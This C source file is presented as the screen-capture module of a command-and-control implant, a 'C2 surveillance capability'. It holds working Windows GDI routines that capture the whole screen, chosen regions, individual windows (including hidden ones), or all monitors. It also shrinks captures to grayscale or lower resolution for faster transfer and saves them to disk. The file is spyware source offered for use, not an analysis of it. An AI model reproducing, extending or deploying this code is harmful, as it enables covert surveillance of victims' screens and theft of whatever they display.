/*
 * Screenshot - GDI screen capture
 * C2 surveillance capability
 */

#include <windows.h>

#pragma comment(lib, "gdi32.lib")

// ============================================================================
// BASIC SCREENSHOT - GDI
// ============================================================================

BYTE* ss_capture(int* sz)
{
    int w = GetSystemMetrics(0);  // SM_CXSCREEN
    int h = GetSystemMetrics(1);  // SM_CYSCREEN

    HDC hScr = GetDC(0);
    HDC hMem = CreateCompatibleDC(hScr);

    HBITMAP hBmp = CreateCompatibleBitmap(hScr, w, h);
    HGDIOBJ hOld = SelectObject(hMem, hBmp);

    BitBlt(hMem, 0, 0, w, h, hScr, 0, 0, 0x00CC0020);  // SRCCOPY

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;  // Top-down
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = 0;  // BI_RGB

    int stride = ((w * 3 + 3) & ~3);
    int data_sz = stride * h;
    int hdr_sz = 14 + sizeof(bi);  // BITMAPFILEHEADER + INFOHEADER
    *sz = hdr_sz + data_sz;

    BYTE* buf = HeapAlloc(GetProcessHeap(), 0, *sz);

    // BMP file header
    *(WORD*)buf = 0x4D42;  // "BM"
    *(DWORD*)(buf + 2) = *sz;
    *(DWORD*)(buf + 6) = 0;
    *(DWORD*)(buf + 10) = hdr_sz;

    // BMP info header
    for(int i = 0; i < sizeof(bi); i++)
        buf[14 + i] = ((BYTE*)&bi)[i];

    GetDIBits(hMem, hBmp, 0, h, buf + hdr_sz, (BITMAPINFO*)&bi, 0);

    SelectObject(hMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(0, hScr);

    return buf;
}

// ============================================================================
// REGION SCREENSHOT
// ============================================================================

BYTE* ss_region(int x, int y, int w, int h, int* sz)
{
    HDC hScr = GetDC(0);
    HDC hMem = CreateCompatibleDC(hScr);

    HBITMAP hBmp = CreateCompatibleBitmap(hScr, w, h);
    HGDIOBJ hOld = SelectObject(hMem, hBmp);

    BitBlt(hMem, 0, 0, w, h, hScr, x, y, 0x00CC0020);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;

    int stride = ((w * 3 + 3) & ~3);
    int data_sz = stride * h;
    int hdr_sz = 14 + sizeof(bi);
    *sz = hdr_sz + data_sz;

    BYTE* buf = HeapAlloc(GetProcessHeap(), 0, *sz);

    *(WORD*)buf = 0x4D42;
    *(DWORD*)(buf + 2) = *sz;
    *(DWORD*)(buf + 10) = hdr_sz;

    for(int i = 0; i < sizeof(bi); i++)
        buf[14 + i] = ((BYTE*)&bi)[i];

    GetDIBits(hMem, hBmp, 0, h, buf + hdr_sz, (BITMAPINFO*)&bi, 0);

    SelectObject(hMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(0, hScr);

    return buf;
}

// ============================================================================
// WINDOW SCREENSHOT
// ============================================================================

BYTE* ss_window(HWND hwnd, int* sz)
{
    RECT rc;
    GetWindowRect(hwnd, &rc);
    int w = rc.right - rc.left;
    int h = rc.bottom - rc.top;

    HDC hWnd = GetWindowDC(hwnd);
    HDC hMem = CreateCompatibleDC(hWnd);

    HBITMAP hBmp = CreateCompatibleBitmap(hWnd, w, h);
    HGDIOBJ hOld = SelectObject(hMem, hBmp);

    PrintWindow(hwnd, hMem, 0);  // Works for hidden windows

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;

    int stride = ((w * 3 + 3) & ~3);
    int data_sz = stride * h;
    int hdr_sz = 14 + sizeof(bi);
    *sz = hdr_sz + data_sz;

    BYTE* buf = HeapAlloc(GetProcessHeap(), 0, *sz);

    *(WORD*)buf = 0x4D42;
    *(DWORD*)(buf + 2) = *sz;
    *(DWORD*)(buf + 10) = hdr_sz;

    for(int i = 0; i < sizeof(bi); i++)
        buf[14 + i] = ((BYTE*)&bi)[i];

    GetDIBits(hMem, hBmp, 0, h, buf + hdr_sz, (BITMAPINFO*)&bi, 0);

    SelectObject(hMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(hwnd, hWnd);

    return buf;
}

// ============================================================================
// ALL MONITORS
// ============================================================================

BYTE* ss_all_monitors(int* sz)
{
    int x = GetSystemMetrics(76);  // SM_XVIRTUALSCREEN
    int y = GetSystemMetrics(77);  // SM_YVIRTUALSCREEN
    int w = GetSystemMetrics(78);  // SM_CXVIRTUALSCREEN
    int h = GetSystemMetrics(79);  // SM_CYVIRTUALSCREEN

    HDC hScr = GetDC(0);
    HDC hMem = CreateCompatibleDC(hScr);

    HBITMAP hBmp = CreateCompatibleBitmap(hScr, w, h);
    HGDIOBJ hOld = SelectObject(hMem, hBmp);

    BitBlt(hMem, 0, 0, w, h, hScr, x, y, 0x00CC0020);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;

    int stride = ((w * 3 + 3) & ~3);
    int data_sz = stride * h;
    int hdr_sz = 14 + sizeof(bi);
    *sz = hdr_sz + data_sz;

    BYTE* buf = HeapAlloc(GetProcessHeap(), 0, *sz);

    *(WORD*)buf = 0x4D42;
    *(DWORD*)(buf + 2) = *sz;
    *(DWORD*)(buf + 10) = hdr_sz;

    for(int i = 0; i < sizeof(bi); i++)
        buf[14 + i] = ((BYTE*)&bi)[i];

    GetDIBits(hMem, hBmp, 0, h, buf + hdr_sz, (BITMAPINFO*)&bi, 0);

    SelectObject(hMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(0, hScr);

    return buf;
}

// ============================================================================
// COMPRESSED - 8-bit grayscale (smaller size)
// ============================================================================

BYTE* ss_gray(int* sz)
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    HDC hScr = GetDC(0);
    HDC hMem = CreateCompatibleDC(hScr);

    HBITMAP hBmp = CreateCompatibleBitmap(hScr, w, h);
    HGDIOBJ hOld = SelectObject(hMem, hBmp);

    BitBlt(hMem, 0, 0, w, h, hScr, 0, 0, 0x00CC0020);

    // Get 24-bit data first
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;

    int stride24 = ((w * 3 + 3) & ~3);
    BYTE* rgb = HeapAlloc(GetProcessHeap(), 0, stride24 * h);
    GetDIBits(hMem, hBmp, 0, h, rgb, (BITMAPINFO*)&bi, 0);

    // Convert to 8-bit grayscale
    int stride8 = ((w + 3) & ~3);
    int pal_sz = 256 * 4;  // 256 colors * 4 bytes
    int hdr_sz = 14 + sizeof(bi) + pal_sz;
    int data_sz = stride8 * h;
    *sz = hdr_sz + data_sz;

    BYTE* buf = HeapAlloc(GetProcessHeap(), 0, *sz);

    *(WORD*)buf = 0x4D42;
    *(DWORD*)(buf + 2) = *sz;
    *(DWORD*)(buf + 10) = hdr_sz;

    bi.biBitCount = 8;
    bi.biClrUsed = 256;
    for(int i = 0; i < sizeof(bi); i++)
        buf[14 + i] = ((BYTE*)&bi)[i];

    // Grayscale palette
    BYTE* pal = buf + 14 + sizeof(bi);
    for(int i = 0; i < 256; i++) {
        pal[i * 4] = i;
        pal[i * 4 + 1] = i;
        pal[i * 4 + 2] = i;
        pal[i * 4 + 3] = 0;
    }

    // Convert RGB to gray
    BYTE* dst = buf + hdr_sz;
    for(int y = 0; y < h; y++) {
        BYTE* src = rgb + y * stride24;
        BYTE* row = dst + y * stride8;
        for(int x = 0; x < w; x++) {
            // Gray = 0.299R + 0.587G + 0.114B
            row[x] = (src[x*3+2] * 77 + src[x*3+1] * 150 + src[x*3] * 29) >> 8;
        }
    }

    HeapFree(GetProcessHeap(), 0, rgb);

    SelectObject(hMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(0, hScr);

    return buf;
}

// ============================================================================
// SCALED - Reduce resolution for faster transfer
// ============================================================================

BYTE* ss_scaled(int scale, int* sz)
{
    int w = GetSystemMetrics(0) / scale;
    int h = GetSystemMetrics(1) / scale;
    int fw = GetSystemMetrics(0);
    int fh = GetSystemMetrics(1);

    HDC hScr = GetDC(0);
    HDC hMem = CreateCompatibleDC(hScr);

    HBITMAP hBmp = CreateCompatibleBitmap(hScr, w, h);
    HGDIOBJ hOld = SelectObject(hMem, hBmp);

    SetStretchBltMode(hMem, 3);  // HALFTONE
    StretchBlt(hMem, 0, 0, w, h, hScr, 0, 0, fw, fh, 0x00CC0020);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;

    int stride = ((w * 3 + 3) & ~3);
    int data_sz = stride * h;
    int hdr_sz = 14 + sizeof(bi);
    *sz = hdr_sz + data_sz;

    BYTE* buf = HeapAlloc(GetProcessHeap(), 0, *sz);

    *(WORD*)buf = 0x4D42;
    *(DWORD*)(buf + 2) = *sz;
    *(DWORD*)(buf + 10) = hdr_sz;

    for(int i = 0; i < sizeof(bi); i++)
        buf[14 + i] = ((BYTE*)&bi)[i];

    GetDIBits(hMem, hBmp, 0, h, buf + hdr_sz, (BITMAPINFO*)&bi, 0);

    SelectObject(hMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(0, hScr);

    return buf;
}

// ============================================================================
// SAVE TO FILE
// ============================================================================

BOOL ss_save(BYTE* data, int sz, char* path)
{
    HANDLE h = CreateFileA(path, 0x40000000, 0, 0, 2, 0, 0);
    if(h == INVALID_HANDLE_VALUE)
        return 0;

    DWORD wr;
    WriteFile(h, data, sz, &wr, 0);
    CloseHandle(h);
    return 1;
}

// ============================================================================
// EOF
// ============================================================================
